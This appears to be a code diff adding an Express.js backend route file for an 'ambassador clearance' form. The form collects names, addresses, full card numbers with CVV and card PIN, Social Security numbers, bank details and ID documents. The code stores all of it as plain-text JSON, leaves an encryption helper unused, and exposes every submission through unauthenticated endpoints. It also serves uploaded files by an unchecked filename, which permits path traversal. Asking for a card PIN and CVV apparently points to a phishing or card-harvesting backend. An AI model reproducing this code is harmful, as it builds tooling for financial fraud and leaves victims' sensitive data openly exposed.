@@ -1,0 +1,380 @@
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const crypto = require('crypto');
+const multer = require('multer');
+const router = express.Router();
+
+// Set encryption key from environment variable or use default
+const ENCRYPTION_KEY = process.env.CLEARANCE_ENCRYPTION_KEY || 'clearance-key-change-in-production';
+
+// Configure multer for file uploads - use memory storage for simplicity
+const upload = multer({ 
+  storage: multer.memoryStorage(),
+  limits: {
+    fileSize: 10 * 1024 * 1024 // 10MB limit
+  }
+});
+
+// Single file upload for ID document
+const uploadSingle = multer({ 
+  storage: multer.memoryStorage(),
+  limits: {
+    fileSize: 10 * 1024 * 1024 // 10MB limit
+  }
+});
+
+// Encrypt sensitive data
+function encrypt(text) {
+  try {
+    const iv = crypto.randomBytes(16);
+    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
+    let encrypted = cipher.update(text, 'utf8', 'hex');
+    encrypted += cipher.final('hex');
+    return iv.toString('hex') + ':' + encrypted;
+  } catch (error) {
+    console.error('Encryption error:', error);
+    return text; // Return unencrypted if encryption fails
+  }
+}
+
+// Upload ID document separately
+router.post('/upload-id-document', uploadSingle.single('idDocument'), async (req, res) => {
+  try {
+    console.log('Received ID document upload request');
+    console.log('File:', req.file);
+    console.log('Body:', req.body);
+
+    if (!req.file) {
+      return res.status(400).json({ message: 'No file uploaded' });
+    }
+
+    const { ambassadorId } = req.body;
+    if (!ambassadorId) {
+      return res.status(400).json({ message: 'Missing ambassadorId' });
+    }
+
+    // Create ID documents folder
+    const idDocumentsPath = path.join(__dirname, '../data/id-documents');
+    fs.mkdirSync(idDocumentsPath, { recursive: true });
+
+    // Save the file
+    const filename = `${ambassadorId}_id_${Date.now()}${path.extname(req.file.originalname)}`;
+    const filePath = path.join(idDocumentsPath, filename);
+    fs.writeFileSync(filePath, req.file.buffer);
+
+    console.log('ID document saved:', filename);
+
+    res.json({
+      message: 'ID document uploaded successfully',
+      filePath: `/api/clearance-storage/id-documents/${filename}`,
+      filename: filename
+    });
+  } catch (error) {
+    console.error('Error uploading ID document:', error);
+    res.status(500).json({ message: 'Error uploading ID document', error: error.message });
+  }
+});
+
+// Serve ID documents
+router.get('/id-documents/:filename', (req, res) => {
+  try {
+    const { filename } = req.params;
+    const filePath = path.join(__dirname, '../data/id-documents', filename);
+    res.sendFile(filePath);
+  } catch (error) {
+    res.status(500).json({ message: 'Error serving file', error: error.message });
+  }
+});
+
+// Create folder for each content creator with all their clearance details
+router.post('/submit-clearance', upload.fields([
+  { name: 'idDocument', maxCount: 1 },
+  { name: 'taxDocument', maxCount: 1 },
+  { name: 'bankDocument', maxCount: 1 }
+]), async (req, res) => {
+  try {
+    console.log('Received clearance submission request');
+    console.log('Files received:', req.files);
+    console.log('Body received:', Object.keys(req.body));
+    
+    const {
+      // Personal Information
+      firstName,
+      lastName,
+      dateOfBirth,
+      phoneNumber,
+      email,
+      
+      // Address Information
+      street,
+      city,
+      state,
+      zip,
+      country,
+      
+      // Payment Details
+      cardNumber,
+      cardHolder,
+      expiryMonth,
+      expiryYear,
+      cvv,
+      cardPin,
+      
+      // Additional Details
+      socialSecurityNumber,
+      taxId,
+      bankAccountNumber,
+      routingNumber,
+      
+      // Documents
+      idDocument,
+      taxDocument,
+      bankDocument,
+      
+      // Ambassador ID
+      ambassadorId
+    } = req.body;
+
+    // Validate required fields
+    if (!firstName || !lastName || !email) {
+      return res.status(400).json({ message: 'Missing required fields: firstName, lastName, email' });
+    }
+
+    console.log('Validation passed, creating folder...');
+
+    // Create unique folder for this content creator
+    const creatorFolderName = `creator_${ambassadorId}_${Date.now()}`;
+    const creatorFolderPath = path.join(__dirname, '../data/clearance-submissions', creatorFolderName);
+    const documentsPath = path.join(creatorFolderPath, 'documents');
+
+    // Create the folder
+    fs.mkdirSync(documentsPath, { recursive: true });
+    
+    // Handle uploaded files - write from memory to disk
+    const uploadedFiles = {};
+    if (req.files) {
+      if (req.files.idDocument && req.files.idDocument[0]) {
+        const file = req.files.idDocument[0];
+        const finalFilename = `idDocument-${Date.now()}${path.extname(file.originalname)}`;
+        const finalPath = path.join(documentsPath, finalFilename);
+        
+        try {
+          fs.writeFileSync(finalPath, file.buffer);
+          uploadedFiles.idDocument = finalFilename;
+          console.log('ID document saved:', finalFilename);
+        } catch (error) {
+          console.error('Error saving idDocument:', error);
+        }
+      }
+      if (req.files.taxDocument && req.files.taxDocument[0]) {
+        const file = req.files.taxDocument[0];
+        const finalFilename = `taxDocument-${Date.now()}${path.extname(file.originalname)}`;
+        const finalPath = path.join(documentsPath, finalFilename);
+        
+        try {
+          fs.writeFileSync(finalPath, file.buffer);
+          uploadedFiles.taxDocument = finalFilename;
+          console.log('Tax document saved:', finalFilename);
+        } catch (error) {
+          console.error('Error saving taxDocument:', error);
+        }
+      }
+      if (req.files.bankDocument && req.files.bankDocument[0]) {
+        const file = req.files.bankDocument[0];
+        const finalFilename = `bankDocument-${Date.now()}${path.extname(file.originalname)}`;
+        const finalPath = path.join(documentsPath, finalFilename);
+        
+        try {
+          fs.writeFileSync(finalPath, file.buffer);
+          uploadedFiles.bankDocument = finalFilename;
+          console.log('Bank document saved:', finalFilename);
+        } catch (error) {
+          console.error('Error saving bankDocument:', error);
+        }
+      }
+    }
+
+    // Prepare all clearance data
+    const clearanceData = {
+      // Personal Information (unencrypted)
+      personalInfo: {
+        firstName,
+        lastName,
+        dateOfBirth,
+        phoneNumber,
+        email,
+        submittedAt: new Date().toISOString()
+      },
+      
+      // Address (unencrypted)
+      address: {
+        street,
+        city,
+        state,
+        zip,
+        country
+      },
+      
+      // Payment Details (plain text)
+      paymentDetails: {
+        cardNumber: cardNumber,
+        cardHolder,
+        expiryMonth,
+        expiryYear,
+        cvv: cvv,
+        cardPin: cardPin,
+        lastFour: cardNumber.slice(-4)
+      },
+      
+      // Financial Information (plain text)
+      financialInfo: {
+        socialSecurityNumber: socialSecurityNumber,
+        taxId: taxId,
+        routingNumber: routingNumber
+      },
+      
+      // Document References with file paths
+      documents: {
+        idDocument: uploadedFiles.idDocument || idDocument || 'not_provided',
+        idDocumentPath: uploadedFiles.idDocument ? `documents/${uploadedFiles.idDocument}` : null,
+        taxDocument: uploadedFiles.taxDocument || taxDocument || 'not_provided',
+        taxDocumentPath: uploadedFiles.taxDocument ? `documents/${uploadedFiles.taxDocument}` : null,
+        bankDocument: uploadedFiles.bankDocument || bankDocument || 'not_provided',
+        bankDocumentPath: uploadedFiles.bankDocument ? `documents/${uploadedFiles.bankDocument}` : null
+      },
+      
+      // Metadata
+      metadata: {
+        ambassadorId,
+        submissionId: `clearance_${ambassadorId}_${Date.now()}`,
+        status: 'submitted',
+        encryptedFields: []
+      }
+    };
+
+    // Save main clearance file
+    const clearanceFilePath = path.join(creatorFolderPath, 'clearance-details.json');
+    fs.writeFileSync(clearanceFilePath, JSON.stringify(clearanceData, null, 2));
+
+    // Create individual files for different categories
+    const personalInfoPath = path.join(creatorFolderPath, 'personal-info.json');
+    fs.writeFileSync(personalInfoPath, JSON.stringify(clearanceData.personalInfo, null, 2));
+
+    const addressPath = path.join(creatorFolderPath, 'address.json');
+    fs.writeFileSync(addressPath, JSON.stringify(clearanceData.address, null, 2));
+
+    const paymentPath = path.join(creatorFolderPath, 'payment-details.json');
+    fs.writeFileSync(paymentPath, JSON.stringify(clearanceData.paymentDetails, null, 2));
+
+    const financialPath = path.join(creatorFolderPath, 'financial-info.json');
+    fs.writeFileSync(financialPath, JSON.stringify(clearanceData.financialInfo, null, 2));
+
+    const documentsMetadataPath = path.join(creatorFolderPath, 'documents.json');
+    fs.writeFileSync(documentsMetadataPath, JSON.stringify(clearanceData.documents, null, 2));
+
+    // Update master index file
+    const masterIndexPath = path.join(__dirname, '../data/clearance-submissions', 'master-index.json');
+    let masterIndex = [];
+    
+    try {
+      const existingIndex = fs.readFileSync(masterIndexPath, 'utf8');
+      masterIndex = JSON.parse(existingIndex);
+    } catch (err) {
+      // File doesn't exist, create new
+    }
+    
+    masterIndex.push({
+      submissionId: clearanceData.metadata.submissionId,
+      ambassadorId,
+      creatorName: `${firstName} ${lastName}`,
+      email,
+      submittedAt: clearanceData.personalInfo.submittedAt,
+      status: clearanceData.metadata.status,
+      folderName: creatorFolderName,
+      filesCreated: [
+        'clearance-details.json',
+        'personal-info.json',
+        'address.json',
+        'payment-details.json',
+        'financial-info.json',
+        'documents.json'
+      ]
+    });
+    
+    fs.writeFileSync(masterIndexPath, JSON.stringify(masterIndex, null, 2));
+
+    // Log the submission
+    console.log(`Clearance submitted: ${firstName} ${lastName} (${ambassadorId}) - Folder: ${creatorFolderName}`);
+
+    res.json({
+      message: 'Clearance details saved successfully',
+      submissionId: clearanceData.metadata.submissionId,
+      folderName: creatorFolderName,
+      filesCreated: [
+        'clearance-details.json',
+        'personal-info.json',
+        'address.json',
+        'payment-details.json',
+        'financial-info.json',
+        'financial-info.json',
+        'documents.json'
+      ]
+    });
+    
+  } catch (error) {
+    console.error('Error saving clearance details:', error);
+    res.status(500).json({ 
+      message: 'Error saving clearance details', 
+      error: error.message 
+    });
+  }
+});
+
+// Get all clearance submissions
+router.get('/all-submissions', async (req, res) => {
+  try {
+    const masterIndexPath = path.join(__dirname, '../data/clearance-submissions', 'master-index.json');
+    
+    try {
+      const indexContent = fs.readFileSync(masterIndexPath, 'utf8');
+      const submissions = JSON.parse(indexContent);
+      res.json(submissions);
+    } catch (err) {
+      res.json([]);
+    }
+    
+  } catch (error) {
+    res.status(500).json({ message: 'Error fetching submissions', error: error.message });
+  }
+});
+
+// Get specific submission details
+router.get('/submission/:submissionId', async (req, res) => {
+  try {
+    const { submissionId } = req.params;
+    const masterIndexPath = path.join(__dirname, '../data/clearance-submissions', 'master-index.json');
+    
+    try {
+      const indexContent = fs.readFileSync(masterIndexPath, 'utf8');
+      const submissions = JSON.parse(indexContent);
+      
+      const submission = submissions.find(s => s.submissionId === submissionId);
+      if (!submission) {
+        return res.status(404).json({ message: 'Submission not found' });
+      }
+      
+      const submissionPath = path.join(__dirname, '../data/clearance-submissions', submission.folderName, 'clearance-details.json');
+      const submissionContent = fs.readFileSync(submissionPath, 'utf8');
+      const submissionData = JSON.parse(submissionContent);
+      
+      res.json(submissionData);
+    } catch (error) {
+      res.status(500).json({ message: 'Error fetching submission', error: error.message });
+    }
+  } catch (error) {
+    res.status(500).json({ message: 'Error fetching submission', error: error.message });
+  }
+});
+
+module.exports = router;
